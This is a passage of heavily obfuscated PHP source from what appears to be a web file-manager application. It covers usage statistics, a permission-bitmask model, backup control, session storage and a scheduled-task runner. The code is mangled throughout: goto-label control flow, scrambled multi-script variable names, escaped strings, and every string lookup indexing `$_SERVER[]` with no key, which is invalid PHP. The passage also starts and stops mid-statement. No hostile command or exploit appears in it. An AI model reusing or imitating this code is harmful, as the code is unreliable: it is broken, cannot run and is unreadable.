Bḿ; Bḿ: $FĨ =& $_SERVER[]; $Dﺍ = $this->listData(); if ($Dﺍ) { $Dж = end($Dﺍ); $dΤ = date($FĨ[2041], strtotime($FĨ[2042])); if ($Dж[$FĨ[210]] == $dΤ) { return $Dﺍ; } $F = strtotime($Dж[$FĨ[210]]); } goto FÓ; C𪡄: foreach ($e as $dΤ) { $this->{$Bοᓨ}($dΤ); } return $this->listData(); goto bУʨ; FÓ: if (!isset($F)) { $a阈 = $B؊ҟ == $FĨ[537] ? $FĨ[479] : $FĨ[751]; $F = Model($a阈)->min($FĨ[187]); } $Bοᓨ = $FĨ[2043] . ucfirst($B؊ҟ); $e = $this->dateList($F); goto C𪡄; bУʨ: } private function dateList($a겧) { $aЯƌ =& $_SERVER[]; $eԇ¯ = $a겧; $a = strtotime($aЯƌ[2042]); $CӨ = array(); while ($eԇ¯ <= $a) { $CӨ[] = date($aЯƌ[2041], $eԇ¯); $eԇ¯ = strtotime($aЯƌ[2044], $eԇ¯); } return $CӨ; } public function _recordUser($Dܽ = '') { goto cϧԓ; A: $Bꗙ = array($f܆[187] => array($f܆[928], $c)); $Bѓ = Model($f܆[479])->where($Bꗙ)->count($f܆[1437]); $Bꗙ[$f܆[187]] = array($f܆[321], array($Aʌ, $c)); goto c»; cϧԓ: $f܆ =& $_SERVER[]; $Aʌ = strtotime(date($f܆[2045], strtotime($Dܽ))); $c = strtotime(date($f܆[2046], strtotime($Dܽ))); goto A; c»: $A = Model($f܆[479])->where($Bꗙ)->count($f܆[1437]); $Bꗙ[$f܆[29]] = $f܆[2047]; $F͒㦷 = Model($f܆[2048])->where($Bꗙ)->count($f܆[2049]); goto fǛ˙; fǛ˙: $cî = array($f܆[210] => $Dܽ, $f܆[699] => (int) $Bѓ, $f܆[2034] => (int) $A, $f܆[2035] => (int) $F͒㦷); return $this->insert($cî); goto D眠; D眠: } public function _recordStore($FԷ = '') { goto FыȲ; bء܍: $b[$D܉݉[371]] = 1; $BΈ = Model($D܉݉[751])->where($b)->sum($D܉݉[77]); $b[$D܉݉[371]] = 2; goto C; bⴉ: $EȜ = Model($D܉݉[422])->where($b)->sum($D܉݉[77]); $b[$D܉݉[370]] = 0; $d = Model($D܉݉[751])->where($b)->sum($D܉݉[77]); goto bء܍; FыȲ: $D܉݉ =& $_SERVER[]; $a车 = strtotime(date($D܉݉[2046], strtotime($FԷ))); $b = array($D܉݉[187] => array($D܉݉[928], $a车)); goto bⴉ; C: $b = Model($D܉݉[751])->where($b)->sum($D܉݉[77]); $cƩ = array($D܉݉[210] => $FԷ, $D܉݉[697] => (int) $d, $D܉݉[2038] => (int) $EȜ, $D܉݉[2039] => (int) $BΈ, $D܉݉[2040] => (int) $b); return $this->insert($cƩ); goto E丨; E丨: } public function trend($c㠙Ž, $Bт) { goto eϖ; Fؼ҂: return $E; goto Dצֳ; eϖ: $a瑰 =& $_SERVER[]; if (!$this->init($c㠙Ž)) { return !1; } $fӍ = $this->trendList($c㠙Ž); goto D; D: if ($fӍ && $Bт != $a瑰[1412]) { $bڏ = $fӍ[0][$a瑰[210]]; $E氵 = $this->validDate($Bт, $bڏ); $Fۋ = array(); $BӼԭ = array_to_keyvalue($fӍ, $a瑰[210]); foreach ($E氵 as $eΈ) { if (isset($BӼԭ[$eΈ])) { $f = $BӼԭ[$eΈ]; } else { $f = end($fӍ); $f[$a瑰[210]] = $eΈ; if ($c㠙Ž == $a瑰[537]) { $f[$a瑰[2034]] = $f[$a瑰[2035]] = 0; } } $Fۋ[] = $f; } $fӍ = $Fۋ; } $e¡ = array($a瑰[537] => array($a瑰[699] => LNG($a瑰[2050]), $a瑰[2034] => LNG($a瑰[2051]), $a瑰[2035] => LNG($a瑰[2052])), $a瑰[2036] => array($a瑰[697] => LNG($a瑰[2053]), $a瑰[2038] => LNG($a瑰[2054]), $a瑰[2039] => LNG($a瑰[2055]), $a瑰[2040] => LNG($a瑰[2056]))); $e = array($a瑰[537] => $a瑰[2057], $a瑰[2036] => $a瑰[77]); goto CÔϦ; CÔϦ: if (empty($fӍ)) { $eΈ = date($a瑰[2041], strtotime($a瑰[2042])); $f޶ = array($a瑰[210] => $eΈ); foreach ($e¡[$c㠙Ž] as $E˕ => $Bؿ) { $f޶[$E˕] = 0; } $fӍ[] = $f޶; } $E = array(); foreach ($fӍ as $Bؿ) { if ($c㠙Ž == $a瑰[2036] && $Bؿ[$a瑰[2038]] > $Bؿ[$a瑰[697]]) { $Bؿ[$a瑰[2038]] = $Bؿ[$a瑰[697]]; } foreach ($e¡[$c㠙Ž] as $E˕ => $bӃ鞆) { $f = array($a瑰[210] => $Bؿ[$a瑰[210]], $a瑰[1343] => $bӃ鞆); $f[$e[$c㠙Ž]] = isset($Bؿ[$E˕]) ? $Bؿ[$E˕] : 0; $E[] = $f; } } goto Fؼ҂; Dצֳ: } public function validDate($cƊ, $E) { goto e; e: $bË =& $_SERVER[]; $B̊ = date($bË[2041], strtotime($bË[2042])); $E܎ = array($B̊); goto a; b鮔: return $E܎; goto Eؗʺ; a: switch ($cƊ) { case $bË[1419]: $Bޟ = mktime(0, 0, 0, date($bË[2058]), date($bË[2059]) - date($bË[1228]) + 7 - 7, date($bË[2060])); $Dÿ = 0; do { $B켔 = date($bË[2041], $Bޟ - 3600 * 24 * 7 * $Dÿ); $E܎[] = $B켔; $Dÿ++; } while ($E < $B켔); break; case $bË[1417]: $Dÿ = 1; do { $aϘ = date($bË[2061], strtotime("\55\40{$Dÿ}\40\x6d\x6f\156\x74\150\x73")); $E܎[] = $aϘ; $Dÿ++; } while ($E < $aϘ); break; case $bË[1726]: $CĤ㡿 = (int) date($bË[2060], strtotime($E)); $dʻÎ = (int) date($bË[2060]); if ($CĤ㡿 >= $dʻÎ) { break; } for ($CĤ㡿; $CĤ㡿 < $dʻÎ; $CĤ㡿++) { $E܎[] = $CĤ㡿 . $bË[2062]; } break; default: break; } if ($E > end($E܎)) { array_pop($E܎); } sort($E܎); goto b鮔; Eؗʺ: } public function listTable($eē) { $E = ucfirst($eē); return Model($E)->listData(); } public function option($E֧) { $DͬЪ = $_SERVER[][2063] . ucfirst($E֧); return $this->{$DͬЪ}(); } private function optionUser() { goto fǉ; dӇ: $Dض۳ = Model($B網[479])->where($fᶱ)->count($B網[1437]); return array($B網[694] => (int) $eք, $B網[2067] => (int) ($eք - $FʈŐ), $B網[2068] => (int) $FʈŐ, $B網[2069] => (int) $Dض۳, $B網[2070] => $B); goto aƥ; A: if (!$B) { $B = 1; } $c = strtotime(date($B網[2045])); $fᶱ = array($B網[2066] => array($B網[929], $c)); goto dӇ; C: $c = strtotime($B網[2065]); $fᶱ = array($B網[2066] => array($B網[929], $c)); $B = (int) Model($B網[479])->where($fᶱ)->count($B網[1437]); goto A; fǉ: $B網 =& $_SERVER[]; $eք = Model($B網[479])->count($B網[1437]); $FʈŐ = Model($B網[479])->where($B網[2064])->count($B網[1437]); goto C; aƥ: } private function optionFile() { goto eީ; c: $dܩ = $bє[$e[2038]]; $E܅ = Model($e[751])->where(array($e[370] => 0))->count($e[369]); $B = array($e[370] => 0, $e[187] => array($e[929], strtotime(date($e[2045])))); goto E; E: $FȒ = Model($e[751])->where($B)->sum($e[77]); $dΣ = Model($e[751])->where($B)->count($e[369]); return array($e[697] => $F冨, $e[2038] => $dܩ, $e[2071] => $F冨 - $dܩ, $e[2072] => (int) $FȒ, $e[699] => (int) $E܅, $e[2073] => (int) $dΣ); goto dņ; eީ: $e =& $_SERVER[]; $bє = $this->sourceSize(); $F冨 = $bє[$e[77]]; goto c; dņ: } private function optionAccess() { $dёǴ =& $_SERVER[]; return array($dёǴ[694] => $this->typeLogCnt(), $dёǴ[103] => $this->typeLogCnt($dёǴ[103]), $dёǴ[404] => $this->typeLogCnt($dёǴ[404]), $dёǴ[2074] => $this->typeLogCnt($dёǴ[2074]), $dёǴ[2075] => $this->typeLogCnt($dёǴ[2075]), $dёǴ[537] => $this->typeLogCnt($dёǴ[33], $dёǴ[2049])); } private function typeLogCnt($C͉ = '', $dД = "\151\x64") { goto E؛ǆ; E؛ǆ: $d =& $_SERVER[]; $b = array($d[103] => array($d[2076], $d[2077]), $d[404] => array($d[2078], $d[2079]), $d[2074] => array($d[2080], $d[2081], $d[2082]), $d[2075] => array($d[2083], $d[2084]), $d[2085] => array($d[2086], $d[2087], $d[2088])); $eɜ = strtotime(date($d[2045])); goto a; a: $d蚆Ƹ = array($d[187] => array($d[929], $eɜ)); if ($C͉) { $d蚆Ƹ[$d[29]] = array($d[7], $b[$C͉]); } $d = Model($d[2048])->where($d蚆Ƹ)->count($dД); goto Bڣᴮ; Bڣᴮ: return (int) $d; goto aИ; aИ: } private function optionServer() { goto Aݼ帖; F훞: $E΃ = $D«[0]; $A²љ = $GLOBALS[$Bƛ[6]][$Bƛ[17]]; $aԈ = $A²љ[$Bƛ[889]]; goto Fȩܯ; bϿώ: return array($Bƛ[2091] => $f ? $f[$Bƛ[2092]] : 0, $Bƛ[2093] => $f ? $f[$Bƛ[2094]] : 0, $Bƛ[2095] => (int) $f[$Bƛ[2092]] * 1024 * 1024 * 1024, $Bƛ[2096] => (int) $E, $Bƛ[2097] => ucfirst($E΃), $Bƛ[2098] => $Bƛ[2099] . PHP_VERSION, $Bƛ[2100] => phpBuild64() ? 64 : 32, $Bƛ[693] => str_replace($Bƛ[2101], $Bƛ[905], $aԈ), $Bƛ[337] => ucfirst($aƃω), $Bƛ[28] => $_SERVER[$Bƛ[2102]]); goto dۜ; Fȩܯ: if ($aԈ == $Bƛ[722]) { $B֬ = explode($Bƛ[1078], $A²љ[$Bƛ[888]]); $aԈ = $B֬[0]; } if ($aԈ == $Bƛ[725] || $aԈ == $Bƛ[726]) { $eΥ = Model()->db()->query($Bƛ[2089]); $Aı = $eΥ[0] && isset($eΥ[0][$Bƛ[1342]]) ? $eΥ[0][$Bƛ[1342]] : 0; $aԈ = $Bƛ[2090] . ($Aı ? $Bƛ[8] . $Aı : $Bƛ[33]); } $aƃω = $GLOBALS[$Bƛ[6]][$Bƛ[337]][$Bƛ[753]]; goto bϿώ; dȄՍ: $b = array($Bƛ[742] => $f[$Bƛ[367]]); $E = Model($Bƛ[422])->where($b)->sum($Bƛ[77]); $D« = explode($Bƛ[50], $_SERVER[$Bƛ[139]]); goto F훞; Aݼ帖: $Bƛ =& $_SERVER[]; $f = $this->diskDriver(); $f = KodIO::defaultDriver(); goto dȄՍ; dۜ: } private function diskDriver() { goto B; eћ: $Eܔ = $Dφۇ - @disk_free_space($d̞Â); return array($a삾Ҍ[2092] => $Dφۇ, $a삾Ҍ[2094] => $Eܔ); goto C; eʪ: if ($B͉) { $d̞Â = $a삾Ҍ[2105]; if (function_exists($a삾Ҍ[2106])) { exec($a삾Ҍ[2107], $AՂ֟); $d̞Â = $AՂ֟[1] . $a삾Ҍ[8]; } } if (!file_exists($d̞Â)) { return; } $Dφۇ = @disk_total_space($d̞Â); goto eћ; B: $a삾Ҍ =& $_SERVER[]; $d̞Â = $a삾Ҍ[8]; $B͉ = $GLOBALS[$a삾Ҍ[6]][$a삾Ҍ[2103]] == $a삾Ҍ[2104]; goto eʪ; C: } public function fileChart($aɦ) { goto C趥; C趥: $c =& $_SERVER[]; if (isset($aɦ[$c[1437]])) { return Model($c[751])->userFileTypeProfile($aɦ[$c[1437]]); } if (isset($aɦ[$c[2108]])) { return Model($c[751])->groupFileTypeProfile($aɦ[$c[2108]]); } goto D; b: $Bɗ[$c[371]] = 2; $Cﱴ = Model($c[751])->where($Bɗ)->sum($c[77]); return array($c[697] => $Bʸ[$c[77]], $c[2038] => $Bʸ[$c[2038]], $c[2039] => (int) $BѴ, $c[2040] => (int) $Cﱴ); goto c躷; D: $Bʸ = $this->sourceSize(); $Bɗ = array($c[463] => 0, $c[371] => 1); $BѴ = Model($c[751])->where($Bɗ)->sum($c[77]); goto b; c躷: } private function sourceSize() { $AѼ =& $_SERVER[]; $f促 = Model($AѼ[751])->where(array($AѼ[370] => 0))->sum($AѼ[77]); $C = Model($AѼ[422])->sum($AѼ[77]); if ($C > $f促) { $C = $f促; } return array($AѼ[77] => (int) $f促, $AѼ[2038] => (int) $C); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $Cڈ =& $_SERVER[]; $Fފ = array(array($Cڈ[386] => LNG($Cڈ[2109]), $Cڈ[2110] => $Cڈ[2111], $Cڈ[2112] => 6, $Cڈ[2113] => 1, $Cڈ[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Cڈ[386] => LNG($Cڈ[2115]), $Cڈ[2110] => $Cڈ[2116], $Cڈ[2112] => 1, $Cڈ[2113] => 1, $Cڈ[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cڈ[386] => LNG($Cڈ[2117]), $Cڈ[2110] => $Cڈ[2118], $Cڈ[2112] => 2, $Cڈ[2113] => 1, $Cڈ[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cڈ[386] => LNG($Cڈ[2119]), $Cڈ[2110] => $Cڈ[2118], $Cڈ[2112] => 3, $Cڈ[2113] => 1, $Cڈ[2114] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Cڈ[386] => LNG($Cڈ[2120]), $Cڈ[2110] => $Cڈ[2121], $Cڈ[2112] => 4, $Cڈ[2113] => 1, $Cڈ[2114] => self::AUTH_SHOW | self::AUTH_VIEW), array($Cڈ[386] => LNG($Cڈ[2122]), $Cڈ[2110] => $Cڈ[2123], $Cڈ[2112] => 5, $Cڈ[2113] => 1, $Cڈ[2114] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Cڈ[386] => LNG($Cڈ[2124]), $Cڈ[2110] => $Cڈ[2125], $Cڈ[2112] => 7, $Cڈ[2113] => 1, $Cڈ[2114] => 0)); return $Fފ; } public static function authCheck($dǃ, $D) { $dǃ = intval($dǃ); if (_get($GLOBALS, $_SERVER[][459])) { return !0; } if ($dǃ <= 0) { return !1; } if (($dǃ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($dǃ & $D); } public static function authCheckShow($F䎧׍) { return self::authCheck($F䎧׍, self::AUTH_SHOW); } public static function authCheckView($D͙﹃) { return self::authCheck($D͙﹃, self::AUTH_VIEW); } public static function authCheckDownload($E׋׭) { return self::authCheck($E׋׭, self::AUTH_DOWNLOAD); } public static function authCheckUpload($eׄ䫘) { return self::authCheck($eׄ䫘, self::AUTH_UPLOAD); } public static function authCheckEdit($A␸) { return self::authCheck($A␸, self::AUTH_EDIT); } public static function authCheckRemove($d⃄) { return self::authCheck($d⃄, self::AUTH_REMOVE); } public static function authCheckShare($eݥ) { return self::authCheck($eݥ, self::AUTH_SHARE); } public static function authCheckComment($d) { return self::authCheck($d, self::AUTH_COMMENT); } public static function authCheckEvent($eŭ) { return self::authCheck($eŭ, self::AUTH_EVENT); } public static function authCheckRoot($c) { return self::authCheck($c, self::AUTH_ROOT); } public static function authDisable($dۤ, $A߿) { if (intval($dۤ) <= 0) { return 0; } return intval($dۤ) & ~$A߿; } public $optionType = "\123\171\x73\x74\x65\155\x2e\163\157\x75\x72\143\x65\101\x75\x74\150\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\141\x75\164\150", "\154\x61\142\145\x6c", "\x64\x69\163\x70\x6c\x61\x79", "\163\x79\163\164\145\155", "\163\157\x72\x74"); public function initData() { $Bͫ򻿱 = $this->authDefault(); foreach ($Bͫ򻿱 as $dӂ) { $this->add($dӂ); } } public function listData($d = false, $b = "\x73\x6f\162\x74", $bҼ = false) { return parent::listData($d, $b, $bҼ); } public function update($A, $c왕ӆ) { $DĒ =& $_SERVER[]; $Dȏ = parent::listData($A); $B = $this->findByName($c왕ӆ[$DĒ[28]]); if (!$Dȏ || $B && $B[$DĒ[367]] != $Dȏ[$DĒ[367]]) { return !1; } $this->filterAuth($c왕ӆ[$DĒ[376]]); return parent::update($A, $c왕ӆ); } public function remove($A͆) { $C = parent::listData($A͆); if (!$C || $C[$_SERVER[][1082]]) { return !1; } return parent::remove($A͆); } public function add($CǗ߂ = array()) { goto aﵗ; aﵗ: $E =& $_SERVER[]; if ($this->findByName($CǗ߂[$E[28]])) { return !1; } $AŰ = array($E[28] => $E[33], $E[376] => 1, $E[2126] => $E[2127], $E[2128] => 1, $E[1082] => 0, $E[2129] => 0); goto bᚾ; Eꊚ: return parent::insert($CǗ߂); goto BΞ; bᚾ: $CǗ߂ = array_merge($AŰ, $CǗ߂); $CǗ߂[$E[2129]] = $this->getSort(); $this->filterAuth($CǗ߂[$E[376]]); goto Eꊚ; BΞ: } private function getSort() { $DӉ =& $_SERVER[]; $c = parent::listData(); $a = array_to_keyvalue($c, $DӉ[33], $DӉ[2129]); return empty($a) ? 0 : max($a) + 1; } private function filterAuth(&$a) { goto dň; f: foreach ($Aן as $Dњ) { if (isset($eųݙ[$Dњ])) { $Aן = array_merge($Aן, $eųݙ[$Dњ]); } } $Aן[] = self::AUTH_SHOW; $a = array_sum(array_unique($Aן)); goto fЗ; c᜙: foreach ($dۨ as $Dњ) { if ($a & $Dњ) { $Aן[] = $Dњ; } } if (in_array(self::AUTH_ROOT, $Aן)) { $a = array_sum($dۨ); return; } $eųݙ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto f; dň: if (!$a) { return; } $dۨ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Aן = array(); goto c᜙; fЗ: } public function sort($bˑТ, $c) { return parent::update($bˑТ, $c); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\142\x61\x63\153\165\160\114\x69\x73\164"; public $field = array("\151\157", "\x6e\x61\155\x65", "\163\x74\141\x74\165\163", "\143\x6f\156\164\x65\156\x74", "\x72\x65\x73\165\154\x74", "\164\x69\x6d\x65\x46\162\157\155", "\164\x69\155\x65\124\157"); public function config() { goto Cܘ߆; Aيٹ: $b = is_array($b) ? $b : array(); if (!isset($b[$D̋պƑ[691]])) { $b[$D̋պƑ[691]] = $D̋պƑ[83]; } $Eྑ = array(); goto B; Cܘ߆: $D̋պƑ =& $_SERVER[]; $b = Model($D̋պƑ[1090])->get($D̋պƑ[712]); $b = json_decode($b, !0); goto Aيٹ; B: Action($D̋պƑ[2130])->taskInit(); $fԐ莆 = Model($D̋պƑ[2131])->listData(); foreach ($fԐ莆 as $B٥ڝ) { if ($B٥ڝ[$D̋պƑ[1082]] == $D̋պƑ[83] && $B٥ڝ[$D̋պƑ[1425]] == $D̋պƑ[2132]) { $Eྑ = $B٥ڝ; break; } } goto AĒ; AĒ: if (isset($Eྑ[$D̋պƑ[190]])) { $Eྑ[$D̋պƑ[190]] = json_decode($Eྑ[$D̋պƑ[190]], !0); } if (isset($b[$D̋պƑ[190]])) { $Eྑ[$D̋պƑ[190]][$D̋պƑ[1412]] = $b[$D̋պƑ[190]]; unset($b[$D̋պƑ[190]]); } return array_merge($Eྑ, $b); goto a֓; a֓: } public function listData($F֟ = false, $a = "\155\157\144\x69\x66\171\x54\151\155\x65", $aʎ = false) { return parent::listData($F֟, $a, !0); } public function lastItem() { $E = $this->listData(); return !empty($E[0]) ? $E[0] : null; } public function kill($E샦) { goto dۤ; Dٹ: Task::kill($F[711]); Task::kill($F[727]); Task::kill($F[735]); goto c; dۤ: $F =& $_SERVER[]; $cؠ㛐 = $this->listData($E샦); if (!$cؠ㛐 || empty($cؠ㛐[$F[28]])) { return !0; } goto Dٹ; cƾ: return $this->remove($E샦); goto FƌŨ; c: $Fº = $cؠ㛐[$F[28]]; $D = TEMP_FILES . $F[708] . $Fº . $F[8]; IO::remove($D, !1); goto cƾ; FƌŨ: } public function remove($EǊ) { $D = $this->listData($EǊ); if (!$D) { return !0; } return $this->backupRemove($D); } private function backupRemove($F) { $bӂ⊳ =& $_SERVER[]; parent::remove($F[$bӂ⊳[367]]); $cЫ = "\x7b\x69\157\72{$F[$bӂ⊳[690]]}\175\57\x64\x61\164\141\142\x61\163\x65\x2f\x62\x61\143\153\165\160\x5f" . $F[$bӂ⊳[28]]; IO::remove($cЫ, !1); return !0; } public function start() { goto e튩; F: return !0; goto c𝒙; e튩: $Eʞ =& $_SERVER[]; if ($GLOBALS[$Eʞ[6]][$Eʞ[84]][$Eʞ[2133]] != $Eʞ[83]) { return !0; } $D𢋱 = $this->config(); goto C뮖Ӓ; a՛: if (!$c𗫢->dbFile()) { return !1; } if ($D𢋱[$Eʞ[691]] == $Eʞ[470]) { $c𗫢->file(); } Backup::set(array($Eʞ[688] => 1, $Eʞ[449] => time())); goto F; C뮖Ӓ: if (!$D𢋱 || $D𢋱[$Eʞ[1409]] != $Eʞ[83]) { return !1; } $CǑ = $this->process(); foreach ($CǑ as $bڰ) { if ($bڰ) { return Task::restart($bڰ[$Eʞ[367]]); } } goto Aкޛ; Aкޛ: $c𗫢 = new Backup(); $c𗫢->keep(); if (!$c𗫢->db()) { return !1; } goto a՛; c𝒙: } public function process() { $e︩ =& $_SERVER[]; return array($e︩[693] => Task::get($e︩[711]), $e︩[696] => Task::get($e︩[727]), $e︩[167] => Task::get($e︩[735])); } public function restore() { $B =& $_SERVER[]; ActionCall($B[975], !0, 1); ActionCall($B[975], !0, 0); } } goto bա; A: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto F֙; cĺ: if (self::$sessionSign) { } else { if (Cookie::get($a)) { self::$sessionSign = Cookie::get($a); } else { self::$sessionSign = guid(); } } Cookie::setSafe($a, self::$sessionSign, self::$sessionTime); $e = $E쿦Ź[$bߏ[1399]]; goto Äق; F֙: $bߏ =& $_SERVER[]; static $dԴܦԊ = false; if ($dԴܦԊ) { return $dԴܦԊ; } goto Fɹ; Äق: $Aά錝 = $E쿦Ź[$e]; $FП݇т = $E쿦Ź[$bߏ[754]]; switch ($e) { case $bߏ[17]: self::$handle = Model($bߏ[755]); break; case $bߏ[756]: self::$handle = new CacheRedis($Aά錝, $FП݇т); break; case $bߏ[757]: self::$handle = new CacheMemcached($Aά錝, $FП݇т); break; case $bߏ[167]: $Aά錝[$bߏ[75]] = $Aά錝[$bߏ[75]] . $bߏ[1400]; self::$handle = new CacheFile($Aά錝, $FП݇т); default: break; } goto B; B: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $dԴܦԊ = new self(); return $dԴܦԊ; goto FۡѨ; Fɹ: $E쿦Ź = $GLOBALS[$bߏ[6]][$bߏ[337]]; self::$sessionTime = $E쿦Ź[$bߏ[1397]]; $a = isset($GLOBALS[$bߏ[1398]]) ? $GLOBALS[$bߏ[1398]] : SESSION_ID; goto cĺ; FۡѨ: } public static function sign($eԋć = false) { $eԋć && (self::$sessionSign = $eԋć); self::init(); return self::$sessionSign; } public static function set($d, $eշͺ = false) { self::init(); if (is_array($d)) { foreach ($d as $D摂 => $E) { array_set_value(self::$data, $D摂, $E); } } else { array_set_value(self::$data, $d, $eշͺ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($b˹ = false) { self::init(); if (!$b˹) { return self::$data; } return array_get_value(self::$data, $b˹); } public static function remove($Dㆄ) { self::init(); unset(self::$data[$Dㆄ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][759])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto B͵α; dƔ: while (!0) { self::cacheClear(); if (self::valueGet($E[688]) != $E[83]) { self::valueSet($E[1401], $E[470]); self::log($E[1405]); die; } self::valueSet($E[1401], $E[83]); self::valueSet($E[1402], time()); self::taskRunAll(); sleep(self::valueGet($E[1406])); } goto e; f⬍: http_close(); self::valueSet($E[1401], $E[83]); Hook::bind($E[1403], $E[1404]); goto dƔ; B͵α: $E =& $_SERVER[]; if (self::valueGet($E[688]) != $E[83]) { return; } if (self::valueGet($E[1401]) == $E[83]) { $f۬ = self::valueGet($E[1402]); if (time() - $f۬ > 3600 * 2) { self::restart(); } return; } goto f⬍; e: } public static function restart() { $a =& $_SERVER[]; http_close(); self::valueSet($a[688], $a[470]); sleep(self::valueGet($a[1406]) + 5); self::valueSet($a[1401], $a[470]); self::valueSet($a[688], $a[83]); } public static function shutdownEvent() { $f =& $_SERVER[]; self::valueSet($f[1401], $f[470]); self::log($f[1407]); } public static function config($d䞳, $d) { $C楆 =& $_SERVER[]; $E꺊 = 20; $d = intval($d) <= $E꺊 ? $E꺊 : intval($d); self::valueSet($C楆[688], $d䞳); self::valueSet($C楆[1406], $d); } private static function taskRunAll() { $fɬ =& $_SERVER[]; $aƐ = Model($fɬ[1408])->listData(); $e = count($aƐ); for ($f = 0; $f < $e; $f++) { $cЩ = $aƐ[$f]; if ($cЩ[$fɬ[1409]] != $fɬ[83]) { continue; } if (!self::taskTimeCheck($cЩ)) { continue; } self::taskRun($cЩ); } Hook::trigger($fɬ[1410]); } private static function taskTimeCheck($c婙) { goto FĎ; d: $b⍪ = strtotime($F؉[1411] . $EҊӟ[$F؉[1412]] . $F؉[1413]) - strtotime($F؉[1414]); $dՉή = time() - strtotime(date($F؉[1415]) . $F؉[1416]); $Cګ = $dՉή >= $b⍪ && $dՉή <= $b⍪ + 3600; goto Fפ; FĎ: $F؉ =& $_SERVER[]; $EҊӟ = json_decode($c婙[$F؉[190]], !0); $C = intval($c婙[$F؉[1402]]); goto d; Fפ: switch ($EҊӟ[$F؉[29]]) { case $F؉[1417]: if (time() - $C < 3600 * 24 * 30) { return !1; } if ($EҊӟ[$F؉[1417]] == date($F؉[1418]) && $Cګ) { return !0; } break; case $F؉[1419]: if (time() - $C < 3600 * 24 * 7) { return !1; } $e = date($F؉[1420]) == 0 ? 7 : date($F؉[1420]); if ($EҊӟ[$F؉[1419]] == $e && $Cګ) { return !0; } break; case $F؉[1412]: if (time() - $C < 3600 * 24) { return !1; } if ($Cګ) { return !0; } break; case $F؉[1421]: if (time() - $C >= floatval($EҊӟ[$F؉[1421]]) * 60) { return !0; } break; default: break; } return !1; goto Dㆹ; Dㆹ: } public static function taskRun($Aу) { goto eэ; e: $A = timeFloat(); $Eџګ = $D[33]; switch ($Aу[$D[29]]) { case $D[295]: $e = url_request($Aу[$D[1425]], $D[216], !1, !1, !1, !1, 5); $Eџګ = strlen($e); break; case $D[215]: $Eџګ = Hook::apply($Aу[$D[1425]]); default: break; } goto cھ; cھ: Model($D[1426])->add(array($D[1427] => $D[33], $D[1428] => $D[470], $D[29] => $D[1429] . $Aу[$D[367]], $D[1430] => json_encode(array($D[28] => $Aу[$D[28]], $D[1431] => timeFloat() - $A, $D[281] => $Eџګ)))); self::log($D[1432] . $Aу[$D[367]] . $D[1433] . $Eџګ); return !0; goto B嚠; eэ: $D =& $_SERVER[]; self::log($D[1422] . $Aу[$D[367]] . $D[1423] . $Aу[$D[28]] . $D[1424] . $Aу[$D[1425]]); Model($D[1408])->run($Aу[$D[367]]); goto e; B嚠: } private static function valueGet($b) { $d֙Қ =& $_SERVER[]; $e񻑯 = $d֙Қ[1434]; $Bพ = Model($d֙Қ[1435])->get($b, $e񻑯); if (is_null($Bพ)) { Model($d֙Қ[1435])->set($d֙Қ[1406], 10, $e񻑯); Model($d֙Қ[1435])->set($d֙Қ[688], $d֙Қ[83], $e񻑯); Model($d֙Қ[1435])->set($d֙Қ[1401], $d֙Қ[470], $e񻑯); $Bพ = Model($d֙Қ[1435])->get($b, $e񻑯); } return $Bพ; } private static function valueSet($EƚӮ, $c뗃) { $f =& $_SERVER[]; return Model($f[1435])->set($EƚӮ, $c뗃, $f[1434]); } protected static function log($c) { write_log($c, $_SERVER[][1436]); } private static function cacheClear() { $B =& $_SERVER[]; $a뾨 = Model($B[1435])->cacheKey($B[1434]); Cache::clearMemory($a뾨); Model($B[1408])->cacheClear(); } } class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\165\156\156\x69\156\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($F񸺷β, $a = '', $e = 0, $e = '') { goto D檐; F˔: Hook::bind($F姝[1403], 